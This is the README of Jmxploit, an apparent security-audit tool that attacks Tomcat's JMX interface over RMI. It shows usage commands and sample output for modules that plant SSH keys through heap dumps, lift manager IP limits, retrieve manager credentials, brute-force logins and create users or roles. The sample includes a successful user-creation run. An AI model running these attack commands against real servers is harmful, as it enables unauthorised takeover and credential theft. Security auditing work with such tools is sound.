Jmxploit
========

Jmxploit is written in Java to audit the security level of the JMX API in Tomcat environment.
This tool is dedicated to security auditors and researchers in order to analyse JMX API security level.

The RMI protocol is used by jmxploit to interact with JMX API.
If no credentials are given in argument one anonymous connection will be attempt.

How to :
=========

Jmxploit offers two method of use.

- The interactive method :

```
$ java -jar jmxploit.jar  --host SERVER --port PORT --login LOGIN --password PASSWORD
```

If authentication succeeded, information about Java environment will appear and menu will ask you to choose a module to launch.

```

test@jmxploit:java -jar jmxploit.jar  --host tomcat --port 8050 --login controlRole --password password

     ____.  _____  ____  ___      .__         .__  __   
    |    | /     \ \   \/  /_____ |  |   ____ |__|/  |_ 
    |    |/  \ /  \ \     /\____ \|  |  /  _ \|  \   __\
/\__|    /    Y    \/     \|  |_> >  |_(  <_> )  ||  |  
\________\____|__  /___/\  \   __/|____/\____/|__||__|  
                 \/      \_/__|                         

Connexion to JMX service at tomcat:8050


Please find below information about server environment

Hosts available : localhost, 
OS Information : Linux 2.X.XX-X-XXX 
Version : Sun Microsystems Inc. OpenJDK Client VM 20.0-b12 
ClassPath and Arguments : /usr/lib/jvm/java-6-openjdk/jre/lib/resources.jar:/usr/lib/jvm/java-6-openjdk/jre/lib/rt.jar:/usr/lib/jvm/java-6-openjdk/jre/lib/sunrsasign.jar:/usr/lib/jvm/java-6-openjdk/jre/lib/jsse.jar:/usr/lib/jvm/java-6-openjdk/jre/lib/jce.jar:/usr/lib/jvm/java-6-openjdk/jre/lib/charsets.jar:/usr/lib/jvm/java-6-openjdk/jre/lib/netx.jar:/usr/lib/jvm/java-6-openjdk/jre/lib/plugin.jar:/usr/lib/jvm/java-6-openjdk/jre/lib/rhino.jar:/usr/lib/jvm/java-6-openjdk/jre/lib/modules/jdk.boot.jar:/usr/lib/jvm/java-6-openjdk/jre/classes
/home/tomcat/apache-tomcat-7.0.42/bin/bootstrap.jar:/home/tomcat/apache-tomcat-7.0.42/bin/tomcat-juli.jar
-Djava.util.logging.config.file=/home/tomcat/apache-tomcat-7.0.42/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Dcom.sun.management.jmxremote -Dcom.sun.management.jmxremote.port=8050 -Dcom.sun.management.jmxremote.ssl=false -Dcom.sun.management.jmxremote.authenticate=true -Djava.rmi.server.hostname=192.168.56.101 -Dcom.sun.management.jmxremote.password.file=../conf/jmxremote.password -Dcom.sun.management.jmxremote.access.file=../conf/jmxremote.access -Djava.endorsed.dirs=/home/tomcat/apache-tomcat-7.0.42/endorsed -Dcatalina.base=/home/tomcat/apache-tomcat-7.0.42 -Dcatalina.home=/home/tomcat/apache-tomcat-7.0.42 -Djava.io.tmpdir=/home/tomcat/apache-tomcat-7.0.42/temp 


#####################################################################################
 Manager seems to be available  on following hosts    : localhost, 
#####################################################################################

Please select a module to launch

[0]	MakeDir		This attack will create a directory on the server	
[1]	CreateFile	This attack will put content in log file and move the log file to the desired directory. File will be overwritten be carefull !!!	
[2]	DumpHeap	This attack will use the dumpHeap methods from com.sun.management. The objective is to put a ssh key on the Linux Server	
[3]	AllowAdress	This attack will remove the ip adress limitation on manager	
[4]	CreateRole	This attack will create a role to assign to users(manager, manager-gui,manager-script,manager-jmx)	
[5]	CreateHost	This attack will create a new host on the server you can choose the application root directory... Why not an open share ?	
[6]	DisplayPassword	This attack will retrieve Manager users' credentials if exists	
[7]	RemoveHost	This attack will remove an hostname on the application server	
[8]	Bruteforce	This module will bruteforce logins/passwords	
[9]	AssignRole	This attack will attribute a role to a user	
[10] CreateUser	This attack will create a user to access Tomcat application's	

```


- The direct attack  method :

In this case jmxploit requires the attack name and required parameters in argument.

To list available attacks please use

```

test@jmxploit:java -jar jmxploit.jar --host SERVER --port PORT --login LOGIN --password PASSWORD --list 

     ____.  _____  ____  ___      .__         .__  __   
    |    | /     \ \   \/  /_____ |  |   ____ |__|/  |_ 
    |    |/  \ /  \ \     /\____ \|  |  /  _ \|  \   __\
/\__|    /    Y    \/     \|  |_> >  |_(  <_> )  ||  |  
\________\____|__  /___/\  \   __/|____/\____/|__||__|  
                 \/      \_/__|                         

List of availables modules
MakeDir			This attack will create a directory on the server
CreateFile		This attack will put content in log file and move the log file to the desired directory. File will be overwritten be carefull !!!
DumpHeap		This attack will use the dumpHeap methods from com.sun.management. The objective is to put a ssh key on the Linux Server
AllowAdress		This attack will remove the ip adress limitation on manager
CreateRole		This attack will create a role to assign to users(manager, manager-gui,manager-script,manager-jmx)
CreateHost		This attack will create a new host on the server you can choose the application root directory... Why not an open share ?
DisplayPassword		This attack will retrieve Manager users' credentials if exists
RemoveHost		This attack will remove an hostname on the application server
Bruteforce		This module will bruteforce logins/passwords
AssignRole		This attack will attribute a role to a user
CreateUser		This attack will create a user to access Tomcat application's

```

To launch one of them without interactive menu:
```
$ java -jar jmxploit.jar --host yourserver --port XXXX --login LOGIN --password PASSWORD --attack ModuleName --arg1_to_mod arg1 --arg2_to_mod arg2
```
For example to create user :
```
test@jmxploit:java -jar jmxploit.jar  --host tomcat --port 8050 --login controlRole --password password --attack CreateUser --username tomcat_user

     ____.  _____  ____  ___      .__         .__  __   
    |    | /     \ \   \/  /_____ |  |   ____ |__|/  |_ 
    |    |/  \ /  \ \     /\____ \|  |  /  _ \|  \   __\
/\__|    /    Y    \/     \|  |_> >  |_(  <_> )  ||  |  
\________\____|__  /___/\  \   __/|____/\____/|__||__|  
                 \/      \_/__|                         

Connexion to JMX service at tomcat:8050
CreateUser will be launch
#### createUser operation will be invoke ####
#### Operation createUser has been successfully invoked ####


 User should be created
```
 
Contact : jeremy.mousset@bt.com
